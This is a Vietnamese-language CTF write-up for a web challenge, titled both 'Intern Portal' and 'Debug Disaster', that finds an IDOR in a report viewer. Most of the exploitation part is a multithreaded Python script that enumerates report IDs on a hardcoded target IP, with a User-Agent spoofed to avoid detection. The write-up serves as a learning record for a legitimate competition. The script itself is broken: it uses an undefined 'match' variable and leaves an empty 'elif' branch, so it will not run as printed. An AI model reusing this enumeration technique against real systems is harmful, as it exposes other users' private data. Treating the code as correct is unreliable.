---
title: "Intern Portal"
date: 2026-05-14
platform: "CTF@CIT 2026"
category: "Web"
difficulty: "Hidden"
tags: ["web", "ctf-cit-2026"]
series: "CTF@CIT 2026"
draft: false
---

# ## Debug Disaster
## Challenge Information
- **Category**: Web Exploitation
- **Event**: CTF@CIT 2026
- **Author**: 10splayaSec
- **Difficulty**: Hidden
- **Tags**: #web
---
## 1. Description
>The intern said they made a custom report application... but I don't think security was in mind.
## 2. Overview
Một bài blackbox nhưng cũng đơn giản nốt =))
## 3. Reconnaissance
Giao diện ban đầu là một trang login / register đập vào mặt:

![](./images/Pasted%20image%2020260424103344.png)

Mình cũng đã thử các payload nhận biết sql injection thì hầu hết phản ứng của web vẫn không có gì đáng ngờ, nên mình tạo account và login luôn xem bên trong như thế nào:

![](./images/Pasted%20image%2020260424103447.png)

Đây có thể là một trang có chức năng tương tụ kiểu các app to-do list (nhập vào và ghim lên) hoặc có thể là một trang có sẵn bot check các report, mình sẽ tạo thử 1 report:

![](./images/Pasted%20image%2020260424103615.png)

Vào xem thử thì cũng chưa thấy gì:

![](./images/Pasted%20image%2020260424103635.png)

Thử các payload XSS:

![](./images/Pasted%20image%2020260424103706.png)

Thử SSTI:

![](./images/Pasted%20image%2020260424103746.png)

Mình nghĩ đây chỉ là text thông thường và server sẽ không thực thi các input này, lúc này nhìn lên thanh URL thì mình thấy các report này được định danh bởi tham số `id`, thử đổi bừa `/report?id=1` xem:

![](./images/Pasted%20image%2020260424103916.png)

-> Có lẽ đây là IDOR rồi =)))

Test vài id khác thì lại ra những report của các player trước:

![](./images/Pasted%20image%2020260424104009.png)

Xác nhận IDOR -> Viết script để brute force thử thôi
## 4. Exploitation
Gửi các request đến `/report` với `id` từ 0 đến 20000, mình sẽ dùng đa luồng:

```python
import re  
import requests  
from concurrent.futures import ThreadPoolExecutor, as_completed  
import threading  
  
TARGET_URL = "http://23.179.17.92:5001/report"  
  
COOKIES = {  
    "session": "SEESION THỰC TẾ"  
}  
  
# Thêm để tranh bị phát hiện script
HEADERS = {  
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"  
}  
  
stop_event = threading.Event()  
session = requests.Session()  
session.cookies.update(COOKIES)  
session.headers.update(HEADERS)  
  
def check_id(i):  
    """  
    Hàm này giờ đây sẽ luôn trả về một tuple: (ID, Trạng thái, Dữ liệu bổ sung)    """    if stop_event.is_set():  
        return (i, "SKIPPED", None)  
  
    try:  
        response = session.get(TARGET_URL, params={'id': i}, timeout=3)  
  
        # Nếu trang web trả về 200 và có chữ CIT{  
        if response.status_code == 200 and "CIT{" in response.text:  
  
            if match:  
                # Trích xuất chính xác đoạn Flag tìm được
                flag = match.group(0)  
                stop_event.set()  
                return (i, "FOUND", flag)  
            else:  
                # Dự phòng trường hợp lỗi regex nhưng vẫn thấy chữ CIT{  
                stop_event.set()  
                return (i, "FOUND", response.text)  
        else:  
            # Trả về status code 
            return (i, "NOT_FOUND", response.status_code)  
  
    except requests.exceptions.RequestException as e:  
        # Bắt lỗi timeout hoặc rớt mạng
        return (i, "ERROR", str(e))  
  
def main():  
    print("Bắt đầu quét với Session Cookie và Logging...")  

    with ThreadPoolExecutor(max_workers=10) as executor:  
        futures = {executor.submit(check_id, i): i for i in range(20000)}  
  
        for future in as_completed(futures):  
            result = future.result()  
  
            if result:  
                checked_id, status, data = result  
  
                if status == "FOUND":  
                    print(f"\n[+] TÌM THẤY FLAG TẠI ID: {checked_id}")  
                    print(f"[+] Nội dung: {data}")  
                    executor.shutdown(wait=False, cancel_futures=True)  
                    break  
                elif status == "NOT_FOUND":  
                elif status == "ERROR":  
                    print(f"[!] ID {checked_id}: Lỗi kết nối - {data}")  
  
    print("\nKết thúc quá trình.")  
  
if __name__ == "__main__":  
    main()
```

Done!!

![](./images/Pasted%20image%2020260424203826.png)

![](./images/Pasted%20image%2020260424203617.png)

>h@ppy h@ck!n9 
>*(BKSEC)*